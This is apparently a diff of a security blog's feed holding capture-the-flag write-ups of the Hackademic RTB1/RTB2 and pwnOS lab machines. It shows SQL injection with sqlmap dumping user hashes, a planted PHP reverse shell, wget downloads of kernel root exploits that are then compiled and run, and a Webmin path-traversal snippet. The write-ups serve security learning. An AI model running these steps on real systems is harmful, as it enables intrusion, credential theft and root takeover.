+<pre><code>ServerAdmin webmaster@localhost
+
+DocumentRoot /var/www
+&lt;Directory /&gt;
+    Options FollowSymLinks
+    AllowOverride None
+&lt;/Directory&gt;
+&lt;Directory /var/www/&gt;
+    Options Indexes FollowSymLinks MultiViews
+    AllowOverride None
+    Order allow,deny
+    allow from all
+&lt;/Directory&gt;
+
+ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
+&lt;Directory "/usr/lib/cgi-bin"&gt;
+    AllowOverride None
+    Options +ExecCGI -MultiViews +SymLinksIfOwnerMatch
+    Order allow,deny
+    Allow from all
+&lt;/Directory&gt;
+
+ErrorLog /var/log/apache2/error.log
+
+# Possible values include: debug, info, notice, warn, error, crit,
+# alert, emerg.
+LogLevel warn
+
+CustomLog /var/log/apache2/access.log combined
+
+Alias /doc/ "/usr/share/doc/"
+&lt;Directory "/usr/share/doc/"&gt;
+    Options Indexes MultiViews FollowSymLinks
+    AllowOverride None
+    Order deny,allow
+    Deny from all
+    Allow from 127.0.0.0/255.0.0.0 ::1/128
+&lt;/Directory&gt;
+</code></pre>
+
+<p></VirtualHost>
+```</p>
+
+<p>Now we can execute commands on the backend:</p>
+
+<p><img src="/images/posts/2012/hrt2_6.jpg"></p>
+
+<p>As you can see, most everything in <code>/var/www/</code> is owned by root, which would explain our inability to write anywhere.  The ownership of <code>configuration.php</code> would also explain our ability to retrieve it.</p>
+
+<p>Another interesting bit was found in user p0wnbox&rsquo;s download&rsquo;s folder.  knockknock-0.7.tar.gz.</p>
+
+<p><img src="/images/posts/2012/hrt2_7.jpg"></p>
+
+<p>We can&rsquo;t yet read the configuration file (we&rsquo;re www-data), but it appears that a port knocker is running.  This is likely why I couldn&rsquo;t immediately connect to the :666 Joomla site.  Interesting.</p>
+
+<p>Let&rsquo;s drop a reverse shell onto the box the same way we did the command access.</p>
+
+<p>```
+CREATE TABLE bdshell(
+Sauce TEXT
+);</p>
+
+<p>INSERT INTO bdshell
+VALUES(INSERT INTO shell
+VALUES(
+[SNIP]
+);</p>
+
+<p>SELECT *
+INTO DUMPFILE &lsquo;/var/www/bd.php&rsquo;
+FROM bdshell;
+```</p>
+
+<p>The snipped area from the insert is just a <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">PHP reverse shell</a>, stripped of all apostrophes.  We can now connect to it like so:</p>
+
+<p><img src="/images/posts/2012/hrt2_7.jpg"></p>
+
+<p>Now we&rsquo;ve got a shell on the box as www-data.  A little enumeration&hellip;</p>
+
+<p><code>
+$ whoami
+www-data
+$ uname -a
+Linux HackademicRTB2 2.6.32-24-generic #39-Ubuntu SMP Wed Jul 28 06:07:29 UTC 2010 i686 GNU/Linux
+</code></p>
+
+<p>Huzzah,<a href="http://threatpost.com/en_us/blogs/linux-kernel-flaw-coughs-root-rights-102110">privilege</a> escalation time.  Funny enough, exactly the exploit we used for RTB1.</p>
+
+<p><code>``
+$ cd /tmp
+$ ls
+orbit-gdm
+pulse-PKdhtXMmr18n
+$ wget www.vsecurity.com/download/tools/linux-rds-exploit.c
+--2012-11-19 06:01:56--  http://www.vsecurity.com/download/tools/linux-rds-exploit.c
+Resolving www.vsecurity.com... 209.67.252.12
+Connecting to www.vsecurity.com|209.67.252.12|:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 6435 (6.3K) [text/x-c]
+Saving to:</code>linux-rds-exploit.c'</p>
+
+<pre><code> 0K ......                                                100% 83.6K=0.08s
+</code></pre>
+
+<p>2012-11-19 06:01:56 (83.6 KB/s) &ndash; `linux-rds-exploit.c' saved [6435/6435]</p>
+
+<p>$ ls
+linux-rds-exploit.c
+orbit-gdm
+pulse-PKdhtXMmr18n
+$ gcc linux-rds-exploit.c -o sploit
+$ ./sploit
+[<em>] Linux kernel >= 2.6.30 RDS socket exploit
+[</em>] by Dan Rosenberg
+[<em>] Resolving kernel addresses&hellip;
+ [+] Resolved rds_proto_ops to 0xe099e980
+ [+] Resolved rds_ioctl to 0xe0998090
+ [+] Resolved commit_creds to 0xc016dd80
+ [+] Resolved prepare_kernel_cred to 0xc016e0c0
+[</em>] Overwriting function pointer&hellip;
+[<em>] Linux kernel >= 2.6.30 RDS socket exploit
+[</em>] by Dan Rosenberg
+[<em>] Resolving kernel addresses&hellip;
+ [+] Resolved rds_proto_ops to 0xe099e980
+ [+] Resolved rds_ioctl to 0xe0998090
+ [+] Resolved commit_creds to 0xc016dd80
+ [+] Resolved prepare_kernel_cred to 0xc016e0c0
+[</em>] Overwriting function pointer&hellip;
+[<em>] Triggering payload&hellip;
+[</em>] Restoring function pointer&hellip;
+$ whoami
+root
+$ cd /root
+$ ls
+Desktop
+Key.txt
+```</p>
+
+<p>Bam.  Answering a question I had before,</p>
+
+<p>```
+$ cat /etc/knockd.conf
+[options]</p>
+
+<pre><code>UseSyslog
+</code></pre>
+
+<p>[openHTTPD]</p>
+
+<pre><code>sequence    = 7000,8000,9000
+seq_timeout = 5
+command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 666 -j ACCEPT
+tcpflags    = syn
+</code></pre>
+
+<p>[closeHTTPD]</p>
+
+<pre><code>sequence    = 9000,8000,7000
+seq_timeout = 5
+command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 666 -j ACCEPT
+tcpflags    = syn
 </code></pre>
 
 <p>```</p>
 
-<p>It appears we do.  In fact, it doesn&rsquo;t seem we have write access to anything; we can&rsquo;t even INSERT into any tables.  We&rsquo;ll come back to why this doesn&rsquo;t work in a bit.  For now, I threw a reverse PHP shell on the box for more control.  I used pentestmonkey&rsquo;s great php-reverse-shell, and soon enough had a prompt:</p>
+<p>So we&rsquo;d need to hit 7000, then 8000, then finally 9000 to get accepted.  Fortunately a simple nmap of the box will enable this rule, so it really isn&rsquo;t a very impressive port knocking tool.</p>
 
-<p><img class="center" src="/images/posts/2012/pwnos2_shell.jpg"></p>
-
-<p>I&rsquo;m going to cut out a lot of my trial/error in finding some of this stuff, but note that there is a blog in /var/www.  This provides Simple PHP Blog, which just so happens to be <a href="http://www.exploit-db.com/search/?action=search&amp;filter_page=1&amp;filter_description=Simple+PHP+Blog&amp;filter_exploit_text=&amp;filter_author=&amp;filter_platform=0&amp;filter_type=0&amp;filter_lang_id=0&amp;filter_port=&amp;filter_osvdb=&amp;filter_cve=">vulnerable</a> to LFI; so there&rsquo;s another attack vector for the reverse PHP shell.  Also note the mysqld is listening on 127.0.0.1, which rules out that complex exploit David Kennedy <a href="http://www.exploit-db.com/exploits/19092/">wrote</a>.  Not to mention we&rsquo;re not in a real term.</p>
-
-<p>Note that there are no privilege escalation vulnerabilities for that kernel or for that Ubuntu distribution.  MySQL does not appear to be UDF-injectable, and even though it&rsquo;s telling us we&rsquo;re root@localhost, we simply don&rsquo;t have it.  It is also worth nothing that an attempt to drop a shell script in /etc/cron.d/ and adding a cron entry got AppArmor a bit upset.</p>
-
-<p>My next step was to see if there were any vulnerable binaries uploaded.</p>
-
-<p><code>
-find $1 -type f -print0 | xargs -0 stat --format '%Y :%y %n' | sort -nr | cut -d: -f2- &gt; /tmp/dump.txt
-</code></p>
-
-<p>This dumped modified files by date, so newest at the top, oldest at the bottom.  After getting through all the modified /proc&rsquo;s, I noticed this monster: fakeroot.  Essentially this emulates a root environment but only allows certain file manipulations.  It can be used to run daemons in an environment that&rsquo;s root-like, but not.  This had to be why my MySQL UDF attempts were not working.  Moving on down the list, I noticed another file: /var/mysqli_connect.php.  Weird, what&rsquo;s a PHP file doing in var?</p>
-
-<p>```</p>
-
-<blockquote><p>cat /var/mysqli_connect.php
-[&hellip;]
-// Set the database access information as constants:
-  DEFINE (&lsquo;DB_USER&rsquo;, &lsquo;root&rsquo;);
-  DEFINE (&lsquo;DB_PASSWORD&rsquo;, &lsquo;root@ISIntS&rsquo;);
-  DEFINE (&lsquo;DB_HOST&rsquo;, &lsquo;localhost&rsquo;);
-  DEFINE (&lsquo;DB_NAME&rsquo;, &lsquo;ch16&rsquo;);
-[&hellip;]
-```</p></blockquote>
-
-<p>Oh.  That&rsquo;s&hellip;it?  Really?  Knowing that root was permitted to ssh in, I quickly gave it a shot:</p>
-
-<p><img class="center" src="/images/posts/2012/pwnos2_root.jpg"></p>
-
-<p>Yup.  That was it.  I suppose the idea here is that incompetent developers can hard code root passwords into arbitrary PHP files laying around the system, but it just seems like more of a scavenger hunt in the end.  I was really hoping there was some obscure vulnerability in a binary, or some fun MySQL UDF injection I could&rsquo;ve done.</p>
-
-<p>All in all, fun, but once you&rsquo;ve got a shell its an exercise in frustration.  Can&rsquo;t say I didn&rsquo;t learn anything though.</p>
-
-<p>Note:  If you&rsquo;re running BackTrack5 and need certain VirtualBox features (bidirectional clipboard, shared folders, etc.), you&rsquo;ll need to prepare kernel headers first.  Follow <a href="http://www.backtrack-linux.org/wiki/index.php/Preparing_Kernel_Headers">these</a> instructions before installing Guest Additions.  If you&rsquo;ve got it installed, just reinstall them.  You&rsquo;ll know it&rsquo;s successful if you don&rsquo;t get &lsquo;could not find kernel headers&rsquo; errors.</p>
+<p>Overall a fun disc.  And if there&rsquo;s any interest, I may pick up the Joomla attack tool and continue development of it.</p>
 ]]></content>
   </entry>
   
   <entry>
-    <title type="html"><![CDATA[solving pwn0s]]></title>
-    <link href="http://hatRiot.github.io/blog/2012/06/07/solving-pwn0s/"/>
-    <updated>2012-06-07T01:15:10-06:00</updated>
-    <id>http://hatRiot.github.io/blog/2012/06/07/solving-pwn0s</id>
-    <content type="html"><![CDATA[<p>pwnOS is a vulnerable VM used in penetration testing and vulnerability assessment.  I thought this one was pretty fun, so I&rsquo;ve decided to do a little write up in the various ways it can be attacked.  The VM for it can be found on forums.hackingdojo.com; you need an account to access the forums, but it&rsquo;s worth it.</p>
+    <title type="html"><![CDATA[Solving Hackademic-RTB1]]></title>
+    <link href="http://hatRiot.github.io/blog/2012/11/13/solving-hackademic-rtb1/"/>
+    <updated>2012-11-13T01:24:24-07:00</updated>
+    <id>http://hatRiot.github.io/blog/2012/11/13/solving-hackademic-rtb1</id>
+    <content type="html"><![CDATA[<p>Hackademic is a pseudo-realistic boot2root box that aims for realism over puzzles or steganography (or obscurity like pwn0s2..).  With that, lets start:</p>
 
-<p>The VM comes packaged as a split vmdk, so just loading up the vmx sets everything up.  Booting it up and flipping over to BackTrack, a quick nmap scan gives us a few immediate vectors of attack:</p>
-
-<p><img src="/images/posts/2012/scan.jpg" title="&lsquo;image&rsquo; &lsquo;images&rsquo;" ></p>
-
-<p>So there&rsquo;s a few notable things here; the OpenSSH version, specifically that Debian build, is known to generate weak, predictable SSH keys.  This vulnerability is due to a side-effect of removing a bit of code that effected the initial seeding for the PRNG; instead of seeding it with true, random data, it instead only used a process ID. There are a total of 32,768 process ID&rsquo;s available, meaning, only 32,768 potential seeds to the PRNG.  We can attack this by generating a 2048 bit key (that&rsquo;s the bit size of the RSA key, according to nmap) 32,768 times with the number as a seed.  We&rsquo;ll set this aside, for now, and come back to it.</p>
-
-<p>There&rsquo;s an HTTP server up with some plaintext HTML on it, but nothing worthy of any web-side exploits.  That version of Apache has some DoS vulnerabilities, but that doesn&rsquo;t do much for us.</p>
-
-<p>The next interesting port is actually on 10000; MiniServ is a fairly obscure, hyperminimal web server written in C.  It&rsquo;s barely supported and has a very low exposure level.  On the frontend runs WebMin, a PHP interface for HTTP servers.  As it happens to turn out, there&rsquo;s a vulnerability allowing an attacker to retrieve unauthorized remote files.  This will work harmoniously with our OpenSSH vulnerability above!  I pulled some perl code from <a href="http://www.exploit-db.com/exploits/2017/">here</a> and dumped a few things:</p>
-
-<p><img src="/images/posts/2012/webmin.jpg" title="&lsquo;image&rsquo; &lsquo;images&rsquo;" ></p>
-
-<p>Oh boy users!  Lets back up for a minute and take a look at this exploit.  If we pop open the perl code, we see a little bit of this:</p>
-
-<p>```
- $temp=&ldquo;/..%01&rdquo; x 40;</p>
-
-<pre><code>    if ($tar == '0')
-       { my $url= "http://". $target. ":" . $port ."/unauthenticated/".$temp . $filename;
-        $content=get $url;
-
-        print("\n FILE CONTENT STARTED");
-        print("\n -----------------------------------\n");
-
-        print("$content");
-        print("\n -------------------------------------\n");
-        }
-</code></pre>
+<p>The initial scan:</p>
 
 <p>```</p>
 
-<p>That&rsquo;s about as easy as it gets when it comes to exploits; we&rsquo;re filling up the url with /..%01.  It does this 40 times until the buffer is full, then appends the filename onto the end.    I dug into the Webmin source code to see exactly what was going on; diffing 1.28 and 1.29, I found this:</p>
+<h1>Nmap 6.01 scan initiated Tue Nov 13 22:16:40 2012 as: nmap -sSV -F -T5 -oN hack.scan 192.168.1.168</h1>
 
-<p><img src="/images/posts/2012/diff.jpg" title="&lsquo;image&rsquo; &lsquo;images&rsquo;" ></p>
+<p>Nmap scan report for 192.168.1.168
+Host is up (0.00028s latency).
+Not shown: 98 filtered ports
+PORT   STATE  SERVICE VERSION
+22/tcp closed ssh
+80/tcp open   http    Apache httpd 2.2.15 ((Fedora))
+MAC Address: 08:00:27:3A:9D:2B (Cadmus Computer Systems)</p>
 
-<p>Essentially it was checking for a directory traversal in the path, but only checking &ldquo;..&rdquo;.  In our exploit, we&rsquo;re appending a %01, which is the ASCII Start of Header.  This final, encoded ASCII code can be any control code; that&rsquo;s %00 &ndash; %1F (<a href="http://www.w3schools.com/tags/ref_urlencode.asp">codes</a>).  This works because these codes have no purpose in the URL and do not decode to anything useful; they merely throw off the $b eq &ldquo;..&rdquo; check by doing nothing.  The remainder of the code is left as an exercise for the reader.</p>
+<p>Service detection performed. Please report any incorrect results at <a href="http://nmap.org/submit/">http://nmap.org/submit/</a> .</p>
 
-<p>Now that we&rsquo;ve got a few names, we can run through RSA keys and see if we get a match.  HD Moore of Metasploit has already generated and distributed the keys, and can be retrieved <a href="http://metasploit.com/users/hdm/tools/debian-openssl/">here</a>.  Got &lsquo;em?  Cool; now we can test keys against the usernames in the file.  I used <a href="http://www.exploit-db.com/exploits/5632/">this</a> to iterate through them, but it shouldn&rsquo;t be too hard to code it up yourself.  Essentially we just want to connect to the server with one of the usernames with the generated keys; when we pop a shell, we know we&rsquo;re in:</p>
+<h1>Nmap done at Tue Nov 13 22:16:48 2012 &mdash; 1 IP address (1 host up) scanned in 7.87 seconds</h1>
 
-<p><img src="/images/posts/2012/brute.jpg" title="&lsquo;image&rsquo; &lsquo;images&rsquo;" ></p>
+<p>```</p>
 
-<p>So now we&rsquo;ve got ourselves a private RSA key for account &lsquo;obama&rsquo;.  Testing it out, and&hellip;</p>
+<p>A &lsquo;closed&rsquo; responding ssh and an HTTP server.  Navigating to the site gives us a lovely Wordpress.  Running wpscan..</p>
 
-<p><img src="/images/posts/2012/ssh.jpg" title="&lsquo;image&rsquo; &lsquo;images&rsquo;" ></p>
+<p>```
+root@bt:/pentest/web/wpscan# ruby wpscan.rb &mdash;url <a href="http://192.168.1.168/Hackademic_RTB1/">http://192.168.1.168/Hackademic_RTB1/</a></p>
 
-<p>Success!  So now we&rsquo;ve got a valid account on the box.  We see it&rsquo;s an x86 Ubuntu machine on the 2.6.22 kernel.  What can we do?  Well, immediately I recognize a major vulnerability in the kernel version.  A bit of googling will turn up the vmsplice exploit.  The exploit itself is in fact a chaining of three separate, now patched, vulnerabilities in the fs/splice.c module.  I will let the fantastic article at <a href="https://lwn.net/Articles/268783/">lwn</a> describe the vulnerability in more detail, and instead put it to some use here:</p>
+<hr />
 
-<p><img src="/images/posts/2012/vmsplice_root.jpg" title="&lsquo;image&rsquo; &lsquo;images&rsquo;" ></p>
+<hr />
 
-<p>And just like that we&rsquo;ve got root on the box.</p>
+<p> \ \        / /  <strong> \ / </strong><strong>|               <br/>
+  \ \  /\  / /| |</strong>) | (<strong><em>   </em></strong>  <strong> _ _ </strong><br/>
+   \ \/  \/ / |  <em><strong>/ _</strong> \ / __|/ </em>` | &lsquo;_ \</p>
 
-<p>Other avenues of attack could be sticking Medusa/Hydra on the SSH port and letting it brute force the accounts, exploiting remote uploads to MiniServ, or the local ftruncate root exploit.  Though fairly easy and straightforward (I didn&rsquo;t have to write a line of code), this VM was fun to toy around with.</p>
+<pre><code>\  /\  /  | |     ____) | (__| (_| | | | |
+ \/  \/   |_|    |_____/ \___|\__,_|_| |_| v2.0r7491288
+
+WordPress Security Scanner by the WPScan Team
+</code></pre>
+
+<p> Sponsored by the RandomStorm Open Source Initiative</p>
+
+<hr />
+
+<p>| URL: <a href="http://192.168.1.168/Hackademic_RTB1/">http://192.168.1.168/Hackademic_RTB1/</a>
+| Started on Tue Nov 13 22:20:45 2012</p>
+
+<p>[!] The WordPress &lsquo;<a href="http://192.168.1.168/Hackademic_RTB1/readme.html">http://192.168.1.168/Hackademic_RTB1/readme.html</a>&rsquo; file exists
+[+] WordPress version 1.5.1.1 identified from meta generator</p>
+
+<p>[!] We have identified 2 vulnerabilities from the version number :</p>
+
+<p> | * Title: WordPress &lt;= 1.5.1.1 &ldquo;add new admin&rdquo; SQL Injection Exploit
+ | * Reference: <a href="http://www.exploit-db.com/exploits/1059/">http://www.exploit-db.com/exploits/1059/</a></p>
+
+<p> | * Title: WordPress &lt;= 1.5.1.1 SQL Injection Exploit
+ | * Reference: <a href="http://www.exploit-db.com/exploits/1033/">http://www.exploit-db.com/exploits/1033/</a></p>
+
+<p>[+] Enumerating plugins from passive detection &hellip;
+No plugins found :(</p>
+
+<p>[+] Finished at Tue Nov 13 22:20:45 2012
+[+] Elapsed time: 00:00:00
+root@bt:/pentest/web/wpscan#
+```</p>
+
+<p>Clearly a Wordpress, and quite clearly a very old version.  I couldn&rsquo;t get the listed add admin exploit to work, so I played around with SQLi:</p>
+
+<p><img src="/images/posts/2012/hrt_1.jpg"></p>
+
+<p>The backend appears to be running as root.  Switching over to sqlmap, we can iterate through the backend much quicker:</p>
+
+<p>```
+root@bt:/pentest/database/sqlmap# python sqlmap.py &mdash;url <a href="http://192.168.1.168/Hackademic_RTB1/?cat=0">http://192.168.1.168/Hackademic_RTB1/?cat=0</a> &mdash;users &mdash;passwords</p>
+
+<p>[22:29:16] [INFO] resuming back-end DBMS &lsquo;mysql&rsquo;
+[22:29:16] [INFO] testing connection to the target url
+[22:29:16] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Fedora 13 (Goddard)
+web application technology: PHP 5.3.3, Apache 2.2.15
+back-end DBMS: MySQL 5.0
+[22:29:16] [INFO] fetching database users
+[22:29:16] [INFO] the SQL query used returns 27 entries
+database management system users [1]:
+[*] &lsquo;root&rsquo;@&lsquo;localhost&rsquo;</p>
+
+<p>[22:29:16] [INFO] fetching database users password hashes
+[22:29:17] [INFO] the SQL query used returns 1 entries
+[22:29:17] [INFO] resumed: root
+[22:29:17] [INFO] resumed: 2eaec110380126d7
+do you want to perform a dictionary-based attack against retrieved password hashes? [Y/n/q] n
+database management system users password hashes:
+[*] root [1]:</p>
+
+<pre><code>password hash: 2eaec110380126d7
+</code></pre>
+
+<p>[22:29:18] [INFO] fetched data logged to text files under &lsquo;/pentest/database/sqlmap/output/192.168.1.168&rsquo;</p>
+
+<p>[*] shutting down at 22:29:18</p>
+
+<p>root@bt:/pentest/database/sqlmap#
+```</p>
+
+<p>There&rsquo;s the &lsquo;mysql&rsquo; root hash, which appears to be an old style hash.  Moving forward&hellip;</p>
+
+<p>```
+root@bt:/pentest/database/sqlmap# python sqlmap.py &mdash;url <a href="http://192.168.1.168/Hackademic_RTB1/?cat=0">http://192.168.1.168/Hackademic_RTB1/?cat=0</a> &mdash;current-db</p>
+
+<p>[22:32:10] [INFO] resuming back-end DBMS &lsquo;mysql&rsquo;
+[22:32:10] [INFO] testing connection to the target url
+[22:32:10] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Fedora 13 (Goddard)
+web application technology: PHP 5.3.3, Apache 2.2.15
+back-end DBMS: MySQL 5.0
+[22:32:10] [INFO] fetching current database
+[22:32:10] [INFO] resumed: wordpress
+current database:    &lsquo;wordpress&rsquo;</p>
+
+<p>[*] shutting down at 22:32:10</p>
+
+<p>root@bt:/pentest/database/sqlmap# python sqlmap.py &mdash;url <a href="http://192.168.1.168/Hackademic_RTB1/?cat=0">http://192.168.1.168/Hackademic_RTB1/?cat=0</a> -D wordpress &mdash;tables</p>
+
+<p>[22:33:47] [INFO] resuming back-end DBMS &lsquo;mysql&rsquo;
+[22:33:48] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Fedora 13 (Goddard)
+web application technology: PHP 5.3.3, Apache 2.2.15
+back-end DBMS: MySQL 5.0
+[22:33:48] [INFO] fetching tables for database: &lsquo;wordpress&rsquo;
+[22:33:48] [INFO] the SQL query used returns 9 entries
+[22:33:48] [INFO] resumed: wp_categories
+[22:33:48] [INFO] resumed: wp_comments
+[22:33:48] [INFO] resumed: wp_linkcategories
+[22:33:48] [INFO] resumed: wp_links
+[22:33:48] [INFO] resumed: wp_options
+[22:33:48] [INFO] resumed: wp_post2cat
+[22:33:48] [INFO] resumed: wp_postmeta
+[22:33:48] [INFO] resumed: wp_posts
+[22:33:48] [INFO] resumed: wp_users
+Database: wordpress
+[9 tables]
++&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
+| wp_categories     |
+| wp_comments       |
+| wp_linkcategories |
+| wp_links          |
+| wp_options        |
+| wp_post2cat       |
+| wp_postmeta       |
+| wp_posts          |
+| wp_users          |
++&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+</p>
+
+<p>[*] shutting down at 22:33:48</p>
+
+<p>root@bt:/pentest/database/sqlmap# python sqlmap.py &mdash;url <a href="http://192.168.1.168/Hackademic_RTB1/?cat=0">http://192.168.1.168/Hackademic_RTB1/?cat=0</a> -D wordpress -T wp_users &mdash;columns
+[22:36:06] [INFO] resuming back-end DBMS &lsquo;mysql&rsquo;</p>
+
+<p>[22:36:06] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Fedora 13 (Goddard)
+web application technology: PHP 5.3.3, Apache 2.2.15
+back-end DBMS: MySQL 5.0
+[22:36:06] [INFO] fetching columns for table &lsquo;wp_users&rsquo; in database &lsquo;wordpress&rsquo;
+[22:36:06] [WARNING] the SQL query provided does not return any output
+[22:36:06] [INFO] the SQL query used returns 22 entries
+Database: wordpress
+Table: wp_users
+[22 columns]
++&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
+| Column              | Type                |
++&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
+| ID                  | bigint(20) unsigned |
+| user_activation_key | varchar(60)         |
+| user_aim            | varchar(50)         |
+| user_browser        | varchar(200)        |
+| user_description    | longtext            |
+| user_domain         | varchar(200)        |
+| user_email          | varchar(100)        |
+| user_firstname      | varchar(50)         |
+| user_icq            | int(10) unsigned    |
+| user_idmode         | varchar(20)         |
+| user_ip             | varchar(15)         |
+| user_lastname       | varchar(50)         |
+| user_level          | int(2) unsigned     |
+| user_login          | varchar(60)         |
+| user_msn            | varchar(100)        |
+| user_nicename       | varchar(50)         |
+| user_nickname       | varchar(50)         |
+| user_pass           | varchar(64)         |
+| user_registered     | datetime            |
+| user_status         | int(11)             |
+| user_url            | varchar(100)        |
+| user_yim            | varchar(50)         |
++&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+</p>
+
+<p>[*] shutting down at 22:36:06</p>
+
+<p>root@bt:/pentest/database/sqlmap# python sqlmap.py &mdash;url <a href="http://192.168.1.168/Hackademic_RTB1/?cat=0">http://192.168.1.168/Hackademic_RTB1/?cat=0</a> -D wordpress -T wp_users -C user_pass,user_login,user_level &mdash;dump</p>
+
+<p>[*] starting at 22:38:47</p>
+
+<p>[22:38:47] [INFO] resuming back-end DBMS &lsquo;mysql&rsquo;
+[22:38:47] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Fedora 13 (Goddard)
+web application technology: PHP 5.3.3, Apache 2.2.15
+back-end DBMS: MySQL 5.0
+[22:38:47] [INFO] fetching entries of column(s) &lsquo;user_level, user_login, user_pass&rsquo; for table &lsquo;wp_users&rsquo; in database &lsquo;wordpress&rsquo;
+[22:38:47] [INFO] the SQL query used returns 6 entries
+Database: wordpress
+Table: wp_users
+[6 entries]
++&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
+| user_pass                        | user_login   | user_level |
++&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
+| 21232f297a57a5a743894a0e4a801fc3 | NickJames    | 1          |
+| 50484c19f1afdaf3841a0d821ed393d2 | MaxBucky     | 0          |
+| 7cbb3252ba6b7e9c422fac5334d22054 | GeorgeMiller | 10         |
+| 8601f6e1028a8e8a966f6c33fcd9aec4 | JasonKonnors | 0          |
+| a6e514f9486b83cb53d8d932f9a04292 | TonyBlack    | 0          |
+| b986448f0bb9e5e124ca91d3d650f52c | JohnSmith    | 0          |
++&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+</p>
+
+<p>[*] shutting down at 22:38:50</p>
+
+<p>root@bt:/pentest/database/sqlmap#
+```</p>
+
+<p>The <code>user_level</code> determines their level of access on the Wordpress, with 1 being basic and 10 being administrator.  You can guess which account we went after:</p>
+
+<p><img src="/images/posts/2012/hrt_2.jpg"></p>
+
+<p>Now we&rsquo;ve got an administrative account on the Wordpress.  It&rsquo;s a very basic, very old, Wordpress.  How can we go about getting shell access?</p>
+
+<p><img src="/images/posts/2012/hrt_3.jpg"></p>
+
+<p>By allowing file uploads, increasing the maximum size and adding to the allowable file extensions, we can upload the fantastic <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">PHP reverse shell</a>.  Then all we need to do is open up a netcat listener and navigate to the PHP file in wp-content/&hellip;</p>
+
+<p><img src="/images/posts/2012/hrt_4.jpg"></p>
+
+<p>Now we&rsquo;ve got a shell.  Some enumeration&hellip;</p>
+
+<p><code>
+sh-4.0$ uname -a
+uname -a
+Linux HackademicRTB1 2.6.31.5-127.fc12.i686 #1 SMP Sat Nov 7 21:41:45 EST 2009 i686 i686 i386 GNU/Linux
+sh-4.0$ netstat -vant
+netstat -vant
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address               Foreign Address             State      
+tcp        0      0 0.0.0.0:3306                0.0.0.0:*                   LISTEN      
+tcp        0      0 127.0.0.1:631               0.0.0.0:*                   LISTEN      
+tcp        0      0 127.0.0.1:25                0.0.0.0:*                   LISTEN      
+tcp        0      0 192.168.1.168:47372         192.168.1.232:1234          ESTABLISHED
+tcp        0      0 :::80                       :::*                        LISTEN      
+tcp        0      0 ::1:631                     :::*                        LISTEN      
+tcp        0      0 ::ffff:192.168.1.168:80     ::ffff:192.168.1.118:54299  ESTABLISHED
+sh-4.0$ whoami
+whoami
+apache
+sh-4.0$
+</code></p>
+
+<p>Odd that MySQL is listening on 0.0.0.0, but we couldn&rsquo;t find it on a scan.  Likely iptable rules in place, but we need root first.  How&rsquo;s about a kernel <a href="http://downloads.securityfocus.com/vulnerabilities/exploits/44219.c">privilege escalation vulnerability</a>?</p>
+
+<p><code>``
+sh-4.0$ cd /tmp                     
+cd /tmp
+sh-4.0$ wget downloads.securityfocus.com/vulnerabilities/exploits/44219.c
+wget downloads.securityfocus.com/vulnerabilities/exploits/44219.c
+--2012-11-14 06:52:05--  http://downloads.securityfocus.com/vulnerabilities/exploits/44219.c
+Resolving downloads.securityfocus.com... 143.127.139.111
+Connecting to downloads.securityfocus.com|143.127.139.111|:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 6804 (6.6K) [text/plain]
+Saving to:</code>44219.c'</p>
+
+<pre><code> 0K ......                                                100% 72.1K=0.09s
+</code></pre>
+
+<p>2012-11-14 06:52:05 (72.1 KB/s) &ndash; `44219.c' saved [6804/6804]</p>
+
+<p>sh-4.0$ gcc 44219.c -o sploit
+gcc 44219.c -o sploit
+sh-4.0$ ./sploit
+./sploit
+[<em>] Linux kernel >= 2.6.30 RDS socket exploit
+[</em>] by Dan Rosenberg
+[<em>] Resolving kernel addresses&hellip;
+ [+] Resolved security_ops to 0xc0aa19ac
+ [+] Resolved default_security_ops to 0xc0955c6c
+ [+] Resolved cap_ptrace_traceme to 0xc055d9d7
+ [+] Resolved commit_creds to 0xc044e5f1
+ [+] Resolved prepare_kernel_cred to 0xc044e452
+[</em>] Overwriting security ops&hellip;
+[<em>] Linux kernel >= 2.6.30 RDS socket exploit
+[</em>] by Dan Rosenberg
+[<em>] Resolving kernel addresses&hellip;
+ [+] Resolved security_ops to 0xc0aa19ac
+ [+] Resolved default_security_ops to 0xc0955c6c
+ [+] Resolved cap_ptrace_traceme to 0xc055d9d7
